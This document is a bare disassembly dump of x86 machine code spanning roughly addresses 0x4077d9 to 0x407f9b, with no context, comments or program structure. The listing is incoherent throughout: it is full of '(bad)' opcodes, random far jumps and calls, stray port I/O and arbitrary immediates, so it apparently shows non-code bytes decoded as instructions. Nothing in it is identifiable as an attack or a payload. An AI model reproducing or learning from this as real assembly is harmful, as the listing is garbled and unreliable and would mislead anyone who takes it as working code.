  4077d9:	mov    es,WORD PTR [edx+0x1bfe3ebf]
  4077df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077e0:	int3   
  4077e1:	stc    
  4077e2:	fiadd  DWORD PTR [esi-0x7731b17b]
  4077e8:	in     eax,dx
  4077e9:	sbb    ebp,DWORD PTR [eax-0x8f13a95]
  4077ef:	lods   eax,DWORD PTR ds:[esi]
  4077f0:	xchg   ebp,eax
  4077f1:	inc    esi
  4077f2:	and    eax,0x1f05e8ab
  4077f7:	int3   
  4077f8:	out    0x95,al
  4077fa:	mov    cl,BYTE PTR [eax-0x3a]
  4077fd:	jno    0x4077aa
  4077ff:	xor    BYTE PTR [ecx+edi*8-0x77],dl
  407803:	push   ss
  407804:	sbb    BYTE PTR [ecx],al
  407806:	cli    
  407807:	std    
  407808:	cs in  al,0x98
  40780b:	pushf  
  40780c:	xor    eax,0xc3c647bf
  407811:	(bad)  
  407812:	mov    al,0xf6
  407814:	imul   esp,DWORD PTR [edi-0x65412092],0xffffffd0
  40781b:	inc    DWORD PTR [esi-0x3f6eb51a]
  407821:	inc    esi
  407822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407823:	pop    ebx
  407824:	sahf   
  407825:	push   ebx
  407826:	xchg   ecx,eax
  407827:	mov    cl,0x21
  407829:	ret    0xc6bc
  40782c:	mov    eax,ds:0xd5bf548d
  407831:	xchg   ecx,eax
  407832:	call   DWORD PTR [ebx+0x21dcfc51]
  407838:	out    0x7a,eax
  40783a:	push   edi
  40783b:	mov    ds:0xb45b668a,al
  407840:	mov    bh,0xad
  407842:	mov    bh,0x1d
  407844:	dec    ecx
  407845:	arpl   WORD PTR [ebx+edi*2+0x15],si
  407849:	sbb    al,0xeb
  40784b:	imul   edi,DWORD PTR [ebx+esi*4+0x1f5c5715],0x21548cd5
  407856:	mov    eax,0xf13446cb
  40785b:	jno    0x4078ad
  40785d:	loope  0x40788d
  40785f:	mov    ds:0xd21355da,al
  407864:	cmp    edi,0xf9cb6595
  40786a:	outs   dx,BYTE PTR ds:[esi]
  40786b:	pusha  
  40786c:	pop    ss
  40786d:	shl    ch,cl
  40786f:	dec    esi
  407870:	xchg   BYTE PTR [edi+0x2f7b8a23],al
  407876:	popf   
  407877:	loope  0x407873
  407879:	push   ds
  40787a:	aaa    
  40787b:	test   al,0xb0
  40787d:	mov    fs,WORD PTR [esi-0x4c]
  407880:	ret    0x8dee
  407883:	enter  0xe9c9,0x33
  407887:	jns    0x40787e
  407889:	xor    dl,BYTE PTR [ebx]
  40788b:	dec    edi
  40788c:	cmp    eax,0x45edbf9f
  407891:	bound  eax,QWORD PTR [esi-0x4a]
  407894:	mov    ch,0xf6
  407896:	ret    0x9374
  407899:	push   ds
  40789a:	jmp    0x407830
  40789c:	mov    ebp,0x3e407e89
  4078a1:	xlat   BYTE PTR ds:[ebx]
  4078a2:	pop    ds
  4078a3:	mov    edx,0x81c666f0
  4078a8:	dec    edi
  4078a9:	xor    bl,BYTE PTR [ebx]
  4078ab:	pop    esp
  4078ac:	inc    ebx
  4078ad:	or     DWORD PTR [edi],ebp
  4078af:	adc    DWORD PTR [edx],esi
  4078b1:	or     al,0x13
  4078b3:	loop   0x40791d
  4078b5:	stos   BYTE PTR es:[edi],al
  4078b6:	jne    0x4078dd
  4078b8:	push   0x28
  4078ba:	inc    esp
  4078bb:	imul   ecx,DWORD PTR [esi],0xffffff92
  4078be:	gs or  al,0x15
  4078c1:	sbb    eax,0x8746ac8c
  4078c6:	jo     0x407928
  4078c8:	das    
  4078c9:	push   0xffffffbb
  4078cb:	jle    0x407902
  4078cd:	pop    eax
  4078ce:	pop    ds
  4078cf:	mov    esi,0xdd792a46
  4078d4:	mov    eax,ds:0x716e0759
  4078d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078da:	daa    
  4078db:	mov    ebp,0x54eb0c87
  4078e0:	js     0x407940
  4078e2:	rcl    edx,cl
  4078e4:	xlat   BYTE PTR ds:[ebx]
  4078e5:	test   DWORD PTR [ecx+0x6a],ecx
  4078e8:	xchg   ecx,eax
  4078e9:	sbb    al,0x49
  4078eb:	adc    eax,0xd2a157ff
  4078f0:	push   cs
  4078f1:	cmp    ah,BYTE PTR [edx]
  4078f3:	pop    esp
  4078f4:	in     al,0xf0
  4078f6:	jo     0x407963
  4078f8:	push   ds
  4078f9:	lahf   
  4078fa:	rol    DWORD PTR [ebp-0xa],0x57
  4078fe:	dec    edx
  4078ff:	push   edx
  407900:	fistp  QWORD PTR [eax+0x5b]
  407903:	(bad)  
  407904:	shl    DWORD PTR [ebx],1
  407906:	sub    DWORD PTR [edi+0x46],esi
  407909:	push   ds
  40790a:	dec    edx
  40790b:	push   edx
  40790c:	dec    ecx
  40790d:	cmp    esp,DWORD PTR [ecx+0x34]
  407910:	add    bh,BYTE PTR [edi+0x16]
  407913:	lahf   
  407914:	data16 cli 
  407916:	test   cl,al
  407918:	lods   al,BYTE PTR ds:[esi]
  407919:	pushf  
  40791a:	inc    eax
  40791b:	(bad)
  40791e:	(bad)  
  40791f:	fadd   QWORD PTR [ecx]
  407921:	imul   edx,esi,0xe2fb4d93
  407927:	mov    ch,0x6c
  407929:	test   DWORD PTR [edi-0x18],0x14726670
  407930:	les    ecx,FWORD PTR ds:0x462668bb
  407936:	mov    fs,WORD PTR [edx]
  407938:	ds cwde 
  40793a:	imul   esp,DWORD PTR [ebx-0x59b4a71e],0x50
  407941:	add    edi,ebx
  407943:	pop    esi
  407944:	(bad)  
  407945:	adc    edx,esp
  407947:	mov    esi,0x650df393
  40794c:	(bad)  
  40794d:	push   cs
  40794e:	sub    dl,BYTE PTR ss:[ebx]
  407951:	lods   al,BYTE PTR ds:[esi]
  407952:	test   esi,0xaf437d61
  407958:	ins    BYTE PTR es:[edi],dx
  407959:	dec    ebp
  40795a:	mov    al,ds:0xedef9024
  40795f:	hlt    
  407960:	push   cs
  407961:	dec    esi
  407962:	sub    ch,BYTE PTR [ebp-0x4496d745]
  407968:	ret    0xb68c
  40796b:	push   ss
  40796c:	popf   
  40796d:	jnp    0x407987
  40796f:	pop    eax
  407970:	std    
  407971:	sti    
  407972:	call   0x9141a4de
  407977:	push   0xffffffa5
  407979:	xor    eax,0xd28d933b
  40797e:	fwait
  40797f:	inc    esi
  407980:	jmp    0x93d0:0x7bdd4686
  407987:	aas    
  407988:	mov    BYTE PTR ss:[edx+0x62],dl
  40798c:	pusha  
  40798d:	push   esp
  40798e:	adc    al,0x8e
  407990:	add    BYTE PTR [ebx-0x4d],0xd0
  407994:	test   eax,0xa9df615e
  407999:	stos   BYTE PTR es:[edi],al
  40799a:	adc    esp,esi
  40799c:	xchg   ebp,eax
  40799d:	xor    BYTE PTR [esi-0x7c],ch
  4079a0:	(bad)  
  4079a1:	in     eax,dx
  4079a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079a3:	xchg   esi,eax
  4079a4:	fiadd  DWORD PTR [ebx-0x5]
  4079a7:	repz pop esp
  4079a9:	jecxz  0x407930
  4079ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ac:	rcr    BYTE PTR [eax],0xaa
  4079af:	push   es
  4079b0:	dec    DWORD PTR [edx]
  4079b2:	mov    ds:0x21c346d7,al
  4079b7:	fucomip st,st(6)
  4079b9:	(bad)  
  4079ba:	icebp  
  4079bb:	cmp    al,0x44
  4079bd:	jecxz  0x4079f8
  4079bf:	rcr    BYTE PTR [edi],0x7d
  4079c2:	mov    ds:0xb33297b1,eax
  4079c7:	xlat   BYTE PTR ds:[ebx]
  4079c8:	add    al,0x82
  4079ca:	icebp  
  4079cb:	sbb    eax,0x7242acfe
  4079d0:	mov    DWORD PTR ds:0x9eb5c3d8,esi
  4079d6:	mov    al,0xd4
  4079d8:	out    dx,eax
  4079d9:	mov    cl,0x62
  4079db:	out    0x86,al
  4079dd:	shl    BYTE PTR [eax],0x4c
  4079e0:	xchg   esp,eax
  4079e1:	and    al,0x95
  4079e3:	mov    ecx,0x4b4557a5
  4079e8:	xchg   ecx,eax
  4079e9:	adc    esp,DWORD PTR [edi-0x3855aec3]
  4079ef:	and    al,BYTE PTR [edx+0x350ea400]
  4079f5:	lods   al,BYTE PTR ds:[esi]
  4079f6:	clc    
  4079f7:	pop    es
  4079f8:	outs   dx,DWORD PTR ds:[esi]
  4079f9:	pop    ss
  4079fa:	add    ecx,DWORD PTR ds:0xc239b144
  407a00:	xchg   esp,eax
  407a01:	mov    dl,BYTE PTR [edi+ecx*2+0x28]
  407a05:	push   esp
  407a06:	adc    al,0xdf
  407a08:	dec    edi
  407a09:	mul    bl
  407a0b:	gs jne 0x40799e
  407a0e:	jp     0x407a25
  407a10:	sub    al,ch
  407a12:	xchg   ecx,eax
  407a13:	mov    eax,ds:0x23077190
  407a18:	or     edx,DWORD PTR [edx]
  407a1a:	addr16 dec ebx
  407a1c:	shr    BYTE PTR [edx-0x61],0x57
  407a20:	js     0x407a6a
  407a22:	es in  al,0x45
  407a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a26:	data16 (bad) 
  407a28:	in     al,0x3c
  407a2a:	pop    DWORD PTR [edx+0x29]
  407a2d:	shl    BYTE PTR [ecx],cl
  407a2f:	sti    
  407a30:	aas    
  407a31:	cmc    
  407a32:	pop    esi
  407a33:	and    eax,ecx
  407a35:	push   ebx
  407a36:	(bad)  
  407a37:	jmp    0x4079f8
  407a39:	lods   eax,DWORD PTR ds:[esi]
  407a3a:	(bad)  
  407a3b:	psubsw mm3,QWORD PTR [eax-0x6e]
  407a3f:	nop
  407a40:	imul   ecx,DWORD PTR [esi],0x3a40eb08
  407a46:	lock test eax,0xd2891d0a
  407a4c:	and    esp,eax
  407a4e:	mov    WORD PTR [ecx-0x4a77fe9d],cs
  407a54:	repnz test al,0xab
  407a57:	retf   0xfd07
  407a5a:	in     al,0x46
  407a5c:	ficom  WORD PTR [esp+edx*4]
  407a5f:	shr    DWORD PTR [edx+0x3d],cl
  407a62:	sbb    dh,BYTE PTR [eax+edx*8+0x7069b1af]
  407a69:	hlt    
  407a6a:	div    DWORD PTR [eax+ecx*4]
  407a6d:	push   edi
  407a6e:	popa   
  407a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a70:	ss jno 0x407a37
  407a73:	add    ah,BYTE PTR [edx]
  407a75:	out    0xcd,al
  407a77:	into   
  407a78:	pop    ecx
  407a79:	lahf   
  407a7a:	sub    eax,0x581f690c
  407a7f:	mov    ecx,0xd66be7bc
  407a84:	out    dx,al
  407a85:	add    al,BYTE PTR [ebp-0x31e3aa3f]
  407a8b:	xchg   edi,eax
  407a8c:	mov    esi,0x6b748493
  407a91:	dec    ebx
  407a92:	mov    dl,0x92
  407a94:	std    
  407a95:	xchg   esi,eax
  407a96:	mov    edi,DWORD PTR [edx]
  407a98:	loope  0x407ab1
  407a9a:	jnp    0x407b01
  407a9c:	dec    esi
  407a9d:	popf   
  407a9e:	pop    ds
  407a9f:	jl     0x407ac8
  407aa1:	fs in  eax,0x2c
  407aa4:	mov    ch,0xa3
  407aa6:	lds    ecx,FWORD PTR [edx+0x6af6f6ba]
  407aac:	std    
  407aad:	and    eax,0x451f5f13
  407ab2:	sub    esi,DWORD PTR [ebx+0x7a122160]
  407ab8:	ffree  st(3)
  407aba:	xchg   esp,eax
  407abb:	pushf  
  407abc:	ror    DWORD PTR [eax+eax*8],cl
  407abf:	mov    DWORD PTR [ebp+esi*4+0x3d584fd7],ebx
  407ac6:	mov    edi,0xbffb0f32
  407acb:	retf   0xcf76
  407ace:	out    dx,eax
  407acf:	mov    ch,0x72
  407ad1:	cmc    
  407ad2:	dec    ebp
  407ad3:	mov    eax,0x13506d5
  407ad8:	mov    edi,0x2ad31974
  407add:	add    ebx,DWORD PTR [esi+0x21a9c9fa]
  407ae3:	mov    ds:0x3b53a09e,eax
  407ae8:	lods   al,BYTE PTR ds:[esi]
  407ae9:	and    dl,ah
  407aeb:	adc    DWORD PTR [ebx-0x3],esi
  407aee:	das    
  407aef:	cld    
  407af0:	sub    al,0x10
  407af2:	cli    
  407af3:	fcmovbe st,st(4)
  407af5:	or     eax,0x60bfc781
  407afa:	xchg   esp,eax
  407afb:	aaa    
  407afc:	fcom   DWORD PTR [eax-0x304d76b2]
  407b02:	ds jmp 0x8911267c
  407b08:	(bad)  
  407b09:	loope  0x407af5
  407b0b:	stc    
  407b0c:	mov    ebx,0xdbae70f9
  407b11:	retf   0xa94
  407b14:	(bad)  
  407b15:	fidivr WORD PTR [ebx-0x3c]
  407b18:	leave  
  407b19:	fs cs mov bh,0xec
  407b1d:	iret   
  407b1e:	push   edx
  407b1f:	rcr    DWORD PTR [edi-0x68],cl
  407b22:	add    BYTE PTR [edi],dl
  407b24:	pop    ecx
  407b25:	jmp    0x7c9d:0xbfb2d5ca
  407b2c:	xor    ecx,DWORD PTR [edx+0x11]
  407b2f:	mov    ds:0x886484c5,al
  407b34:	cld    
  407b35:	xor    DWORD PTR [eax+ecx*4+0x7a16cc60],edi
  407b3c:	xor    eax,DWORD PTR [ecx+0x3]
  407b3f:	xchg   ecx,eax
  407b40:	sub    dh,al
  407b42:	in     eax,dx
  407b43:	cli    
  407b44:	imul   ebp,DWORD PTR [edi],0xc033012
  407b4a:	mov    cl,0x5a
  407b4c:	ret    0x8b03
  407b4f:	popf   
  407b50:	repnz loope 0x407b89
  407b53:	pop    edx
  407b54:	add    al,0x61
  407b56:	das    
  407b57:	xchg   esi,eax
  407b58:	std    
  407b59:	push   edx
  407b5a:	cmp    DWORD PTR [eax-0x8],esp
  407b5d:	mov    dh,0x11
  407b5f:	lods   eax,DWORD PTR ds:[esi]
  407b60:	call   0x3547:0x75eea79a
  407b67:	test   ch,al
  407b69:	xchg   ebx,eax
  407b6a:	es in  eax,0x8f
  407b6d:	sub    dh,bh
  407b6f:	sahf   
  407b70:	mul    eax
  407b72:	inc    esi
  407b73:	sbb    al,0xbd
  407b75:	pop    ebp
  407b76:	dec    esi
  407b77:	dec    edi
  407b78:	adc    bh,BYTE PTR es:[edx]
  407b7b:	jecxz  0x407b22
  407b7d:	inc    esi
  407b7e:	jne    0x407be9
  407b80:	dec    ecx
  407b81:	add    DWORD PTR [ebp+0x51],esp
  407b84:	jno    0x407b0a
  407b86:	fdivr  DWORD PTR [ecx]
  407b88:	adc    eax,0x44360e01
  407b8d:	dec    edx
  407b8e:	mov    dl,0x19
  407b90:	jl     0x407bcd
  407b92:	mov    eax,ds:0x61eafb58
  407b97:	inc    ebp
  407b98:	sbb    esp,DWORD PTR [eax+0x286028bc]
  407b9e:	pop    edx
  407b9f:	inc    ecx
  407ba0:	fmul   QWORD PTR [ebp+ebx*8-0x3d]
  407ba4:	push   ebx
  407ba5:	sbb    eax,0xc8287634
  407baa:	pop    eax
  407bab:	jmp    0x840f:0xdd23e2bb
  407bb2:	add    al,0x0
  407bb4:	jg     0x407bdf
  407bb6:	cmp    eax,0xebda915e
  407bbb:	neg    ebp
  407bbd:	cli    
  407bbe:	adc    edx,DWORD PTR [eax+0x72]
  407bc1:	fld    QWORD PTR [ebx+eiz*4+0x2c63a7d3]
  407bc8:	xor    DWORD PTR [ecx-0x23],0xf1d2c3e5
  407bcf:	in     al,0xc2
  407bd1:	xor    ch,BYTE PTR [ebx+0x4e9dae04]
  407bd7:	cmp    eax,0x5db29a18
  407bdc:	sahf   
  407bdd:	je     0x407b5f
  407bdf:	add    BYTE PTR [ecx+0x442f0a32],dl
  407be5:	das    
  407be6:	addr16 and ebx,eax
  407be9:	sti    
  407bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407beb:	mov    ds:0xd3cdafa6,eax
  407bf0:	cmp    BYTE PTR [ebp+0x63],ch
  407bf3:	mov    edx,0xa7aaa357
  407bf8:	test   al,0x21
  407bfa:	les    ebp,FWORD PTR [ebp*1-0x5b6e70dc]
  407c01:	shl    ah,cl
  407c03:	ret    0x10b9
  407c06:	mov    esp,0x27287580
  407c0b:	adc    al,0x54
  407c0d:	fbstp  TBYTE PTR [ebp+0x1e05bede]
  407c13:	or     ah,BYTE PTR [ecx-0xb]
  407c16:	or     DWORD PTR [ebp-0x5e],esp
  407c19:	addr16 jno 0x407c06
  407c1c:	ficomp DWORD PTR [ebp+ecx*1-0x18]
  407c20:	push   edi
  407c21:	dec    edx
  407c22:	push   eax
  407c23:	mov    DWORD PTR [eax],ebp
  407c25:	ins    DWORD PTR es:[edi],dx
  407c26:	enter  0x41b3,0x5f
  407c2a:	mov    cl,0x2e
  407c2c:	addr16 xchg esi,eax
  407c2e:	add    DWORD PTR [eax-0x30],esi
  407c31:	enter  0x83b5,0x7c
  407c35:	jp     0x407be4
  407c37:	or     al,0x97
  407c39:	(bad)  
  407c3a:	ins    DWORD PTR es:[edi],dx
  407c3b:	out    0xc8,al
  407c3d:	loop   0x407cb4
  407c3f:	ss aas 
  407c41:	sbb    ch,BYTE PTR [esi-0x1bda4573]
  407c47:	pop    esp
  407c48:	je     0x407c54
  407c4a:	cmp    BYTE PTR [esi],al
  407c4c:	pusha  
  407c4d:	lods   eax,DWORD PTR ds:[esi]
  407c4e:	mov    cl,0x81
  407c50:	ret    0xddb6
  407c53:	ja     0x140f32e2
  407c59:	mov    eax,ds:0xbc7283a4
  407c5e:	int    0x60
  407c60:	stos   BYTE PTR es:[edi],al
  407c61:	fucomip st,st(0)
  407c63:	repz mov al,0xcc
  407c66:	pop    edx
  407c67:	pop    DWORD PTR [ebp+eax*8-0x244baac3]
  407c6e:	loope  0x407c7f
  407c70:	sbb    al,0x2
  407c72:	cmp    ebp,DWORD PTR [ecx-0x28009557]
  407c78:	inc    esi
  407c79:	xchg   al,cl
  407c7b:	xchg   ebx,eax
  407c7c:	sub    esp,DWORD PTR [eax-0x77bedaa0]
  407c82:	pop    edi
  407c83:	outs   dx,DWORD PTR ds:[esi]
  407c84:	and    ecx,esp
  407c86:	call   FWORD PTR [esi+eiz*2+0x8b8c178]
  407c8d:	adc    al,0xa1
  407c8f:	xor    eax,DWORD PTR [eax+0xc]
  407c92:	aaa    
  407c93:	cmp    eax,DWORD PTR [eax]
  407c95:	jmp    0xbf4c:0x5ba9d63c
  407c9c:	pop    esi
  407c9d:	mov    bh,0xed
  407c9f:	repnz and ch,BYTE PTR ds:0x5349f0e0
  407ca6:	pop    esi
  407ca7:	(bad)  
  407ca8:	cmp    DWORD PTR [eax+0x26f7b3e8],edi
  407cae:	xchg   ebx,eax
  407caf:	out    0x2d,eax
  407cb1:	xlat   BYTE PTR ds:[ebx]
  407cb2:	pusha  
  407cb3:	jmp    esp
  407cb5:	and    DWORD PTR [edx+0x29],esi
  407cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cb9:	pop    es
  407cba:	jl     0x407d2c
  407cbc:	scas   eax,DWORD PTR es:[edi]
  407cbd:	jle    0x407c7a
  407cbf:	popf   
  407cc0:	fsubr  st,st(1)
  407cc2:	mov    esp,DWORD PTR [ebx+0x2a18b80c]
  407cc8:	adc    ecx,DWORD PTR [eax]
  407cca:	scas   al,BYTE PTR es:[edi]
  407ccb:	les    eax,FWORD PTR [eax]
  407ccd:	shl    DWORD PTR [ebp-0xe],1
  407cd0:	mov    edx,0x2191526e
  407cd5:	fs push esi
  407cd7:	lahf   
  407cd8:	int    0x33
  407cda:	sub    DWORD PTR [ebx+0x2cffa649],ebp
  407ce0:	pop    edi
  407ce1:	dec    esp
  407ce2:	(bad)  [edi+ecx*1+0x4e]
  407ce6:	cld    
  407ce7:	cld    
  407ce8:	add    eax,0x12b349cb
  407ced:	imul   edx,DWORD PTR [edi+0x6e],0x3d
  407cf1:	push   ecx
  407cf2:	aam    0xc0
  407cf4:	repz pop ecx
  407cf6:	jmp    0x5812:0xb035f40d
  407cfd:	(bad)  
  407cfe:	js     0x407d3a
  407d00:	es aas 
  407d02:	popa   
  407d03:	jno    0x407d83
  407d05:	push   ss
  407d06:	mov    WORD PTR [esi-0x6efa4f46],fs
  407d0c:	fisub  WORD PTR [eax+0x2d774833]
  407d12:	sahf   
  407d13:	hlt    
  407d14:	fmul   QWORD PTR [ecx+0x1e176d8e]
  407d1a:	cmp    eax,0x1ed54287
  407d1f:	cmp    al,0xc8
  407d21:	out    dx,al
  407d22:	out    dx,eax
  407d23:	adc    al,0x65
  407d25:	ja     0x407d4e
  407d27:	outs   dx,BYTE PTR ds:[esi]
  407d28:	clc    
  407d29:	cdq    
  407d2a:	add    al,0xa5
  407d2c:	xor    bh,ah
  407d2e:	jno    0x407da1
  407d30:	aaa    
  407d31:	fs push ds
  407d33:	mov    BYTE PTR [ecx-0x360703e4],bh
  407d39:	mov    eax,es
  407d3b:	dec    ecx
  407d3c:	push   es
  407d3d:	js     0x407d58
  407d3f:	xchg   edi,eax
  407d40:	rol    DWORD PTR ds:0x6050ab58,0xa4
  407d47:	fld    DWORD PTR [eax-0x5acaaf23]
  407d4d:	cld    
  407d4e:	adc    ah,BYTE PTR [ebx-0x7075b530]
  407d54:	inc    ebx
  407d55:	pusha  
  407d56:	jmp    0x5d2d9af2
  407d5b:	or     al,0x22
  407d5d:	test   BYTE PTR [eax-0x40],cl
  407d60:	imul   eax,DWORD PTR [esi],0xab7d28aa
  407d66:	cld    
  407d67:	mov    BYTE PTR [edx],ch
  407d69:	mul    BYTE PTR fs:0x154573be
  407d70:	das    
  407d71:	xor    BYTE PTR [eax+eiz*2],0x55
  407d75:	loopne 0x407d1c
  407d77:	or     dh,BYTE PTR [ebx-0x26abc0b2]
  407d7d:	push   ds
  407d7e:	arpl   WORD PTR [edi+0x6ea6a1a4],di
  407d84:	sub    al,0x24
  407d86:	dec    eax
  407d87:	inc    ecx
  407d88:	sub    eax,0xee4d8fa2
  407d8d:	aad    0x54
  407d8f:	mov    ah,0x1f
  407d91:	sub    DWORD PTR [edx],edx
  407d93:	popf   
  407d94:	pop    ss
  407d95:	shl    DWORD PTR [edi-0x76],cl
  407d98:	lods   eax,DWORD PTR ds:[esi]
  407d99:	and    DWORD PTR [edi],ebx
  407d9b:	and    eax,0x31c2b933
  407da0:	int3   
  407da1:	inc    esp
  407da2:	adc    al,0x38
  407da4:	repz sbb eax,0x5c9fc990
  407daa:	test   BYTE PTR [edx-0xd],0xec
  407dae:	mov    ecx,edx
  407db0:	mov    ah,0x84
  407db2:	fnstenv [ebp-0x40e601b9]
  407db8:	std    
  407db9:	ret    
  407dba:	scas   eax,DWORD PTR es:[edi]
  407dbb:	xlat   BYTE PTR ds:[ebx]
  407dbc:	dec    ebx
  407dbd:	push   es
  407dbe:	shl    cl,cl
  407dc0:	mov    cl,0xe6
  407dc2:	inc    edi
  407dc3:	int3   
  407dc4:	push   cs
  407dc5:	(bad)  
  407dc6:	in     al,0xdd
  407dc8:	in     eax,dx
  407dc9:	jl     0x407d87
  407dcb:	popa   
  407dcc:	ja     0x407d8d
  407dce:	shl    DWORD PTR [edi+0x2eedabb4],0xaa
  407dd5:	push   ebp
  407dd6:	fiadd  WORD PTR [edx-0x91aee1b]
  407ddc:	add    edx,ecx
  407dde:	sar    DWORD PTR [eax],cl
  407de0:	std    
  407de1:	imul   ebx,DWORD PTR [edi+0x664ed4c2],0xc3a47bad
  407deb:	mov    esi,0xdf584557
  407df0:	out    dx,al
  407df1:	push   es
  407df2:	add    DWORD PTR [eax+0x54],0xffffff9e
  407df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407df7:	push   0xffffffc4
  407df9:	sbb    bh,BYTE PTR [ebp-0x75]
  407dfc:	xchg   DWORD PTR [edi-0x20],ecx
  407dff:	xor    edi,edi
  407e01:	add    dl,dl
  407e03:	dec    ecx
  407e04:	xchg   ebp,eax
  407e05:	test   DWORD PTR [eax],edi
  407e07:	and    eax,0x3dba9cac
  407e0c:	inc    esi
  407e0d:	repnz lock out dx,al
  407e10:	jmp    0xe5a9dffe
  407e15:	inc    edx
  407e16:	lods   al,BYTE PTR ds:[esi]
  407e17:	sbb    al,0x74
  407e19:	mov    ebp,0x926674b6
  407e1e:	out    dx,al
  407e1f:	pop    edi
  407e20:	(bad)  
  407e21:	jle    0x407de0
  407e23:	sub    al,0x9b
  407e25:	idiv   eax
  407e27:	mov    fs:0xc1df7006,eax
  407e2d:	pop    es
  407e2e:	sub    dh,BYTE PTR [ebp+0x658d0987]
  407e34:	nop
  407e35:	jo     0x407e48
  407e37:	dec    edx
  407e38:	cmp    eax,0xd0e0eb8
  407e3d:	mov    DWORD PTR [ebx-0x49],ebp
  407e40:	dec    edi
  407e41:	test   BYTE PTR [ecx],cl
  407e43:	xchg   edi,eax
  407e44:	outs   dx,DWORD PTR ds:[si]
  407e46:	test   DWORD PTR [edi],0x46f26686
  407e4c:	pop    esp
  407e4d:	add    edx,edx
  407e4f:	cmp    ch,BYTE PTR [ebx+0x28]
  407e52:	and    ch,BYTE PTR [edi]
  407e54:	add    eax,edi
  407e56:	jl     0x407e5a
  407e58:	mov    ebp,0x8bcfa972
  407e5d:	je     0x407e05
  407e5f:	lock icebp 
  407e61:	iret   
  407e62:	inc    edx
  407e63:	sbb    ebp,DWORD PTR [esp+eiz*8]
  407e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e67:	clc    
  407e68:	lods   eax,DWORD PTR ds:[esi]
  407e69:	in     eax,dx
  407e6a:	ret    0x3ea5
  407e6d:	fwait
  407e6e:	mov    ds:0xbb07d34b,al
  407e73:	mov    DWORD PTR fs:[ebx-0x653a25a5],edx
  407e7a:	jns    0x407eab
  407e7c:	fild   WORD PTR ds:0xe0bc4e5a
  407e82:	xor    al,0x5
  407e84:	js     0x407e64
  407e86:	js     0x407e76
  407e88:	test   eax,0x6388aaeb
  407e8d:	shr    eax,0xb7
  407e90:	adc    esp,ecx
  407e92:	in     eax,dx
  407e93:	fs test eax,0x9c456575
  407e99:	sbb    al,0x21
  407e9b:	jge    0x407e2c
  407e9d:	into   
  407e9e:	enter  0x3c94,0xd
  407ea2:	xchg   esi,eax
  407ea3:	push   ss
  407ea4:	xchg   edx,eax
  407ea5:	in     eax,0x2d
  407ea7:	and    al,0x34
  407ea9:	jg     0x407e2b
  407eab:	imul   ecx,eax,0x36a8ab9
  407eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb2:	outs   dx,DWORD PTR ds:[esi]
  407eb3:	pop    ds
  407eb4:	lds    ebx,FWORD PTR [edx]
  407eb6:	inc    eax
  407eb7:	pop    edi
  407eb8:	mov    ds:0xbe52ce90,eax
  407ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ebe:	out    dx,al
  407ebf:	xor    bl,bh
  407ec1:	xchg   BYTE PTR [ebp-0x2a],cl
  407ec4:	(bad)  
  407ec5:	and    BYTE PTR [esi],cl
  407ec7:	cmp    eax,0x74ea5e75
  407ecc:	mov    BYTE PTR [ebx+0x5e427658],bl
  407ed2:	add    BYTE PTR [edx+0x756f1a08],bh
  407ed8:	mov    eax,0x5b928641
  407edd:	or     ebp,DWORD PTR [esi-0x5d0c9744]
  407ee3:	ss imul edi,ebp,0x26
  407ee7:	pop    ecx
  407ee8:	(bad)
  407eeb:	cwde   
  407eec:	xor    BYTE PTR [esp+esi*8+0x42],ch
  407ef0:	add    BYTE PTR gs:[esi-0x7b57c870],bh
  407ef7:	push   esp
  407ef8:	(bad)  
  407ef9:	shr    DWORD PTR [ecx-0x10ff139c],0xf8
  407f00:	pop    ds
  407f01:	jmp    0x2a70:0xa383bc99
  407f08:	xor    DWORD PTR [ebp+0x79971d44],ecx
  407f0e:	mov    bl,BYTE PTR [edi]
  407f10:	je     0x407ebf
  407f12:	int    0x50
  407f14:	jg     0x407ecc
  407f16:	outs   dx,BYTE PTR ds:[esi]
  407f17:	mov    ecx,?
  407f19:	iret   
  407f1a:	cli    
  407f1b:	cld    
  407f1c:	mov    ah,0xb5
  407f1e:	call   0x833c:0xbb1c1b72
  407f25:	mov    dl,0xc1
  407f27:	xor    ebx,edi
  407f29:	mov    bh,0xd
  407f2b:	test   al,0x5
  407f2d:	fdiv   st(6),st
  407f2f:	sbb    ebx,DWORD PTR [ebx-0x47167bd7]
  407f35:	xor    DWORD PTR [edi],ebp
  407f37:	mov    BYTE PTR [eax],dh
  407f39:	repz pop esp
  407f3b:	sti    
  407f3c:	adc    dh,BYTE PTR [esi-0x33]
  407f3f:	out    dx,eax
  407f40:	ror    BYTE PTR [esi-0x8c17429],1
  407f46:	and    dl,ch
  407f48:	dec    edx
  407f49:	mov    esp,0x53a070b6
  407f4e:	inc    ebx
  407f4f:	mov    eax,0x326c8073
  407f54:	pop    ebx
  407f55:	fcmove st,st(3)
  407f57:	jae    0x407f98
  407f59:	sti    
  407f5a:	jl     0x407fc4
  407f5c:	aam    0x1a
  407f5e:	(bad)  
  407f60:	test   eax,0xd61f7aa4
  407f65:	pop    esi
  407f66:	int    0x45
  407f68:	adc    eax,0x1d320e0b
  407f6d:	push   edx
  407f6e:	js     0x407fa2
  407f70:	imul   esp,DWORD PTR [esi+edx*2+0x379a3893],0x1f
  407f78:	nop
  407f79:	das    
  407f7a:	sahf   
  407f7b:	hlt    
  407f7c:	int    0x67
  407f7e:	push   cs
  407f7f:	lds    ebx,FWORD PTR [eax]
  407f81:	mov    ds:0x28d3157d,al
  407f86:	jl     0x407f43
  407f88:	repz je 0x407f8b
  407f8b:	ret    0x783c
  407f8e:	int3   
  407f8f:	inc    esp
  407f90:	dec    edx
  407f91:	mov    cl,0xe5
  407f93:	mov    ah,0x10
  407f95:	add    eax,0x1eef0a19
  407f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f9b:	shl    DWORD PTR [edx],1
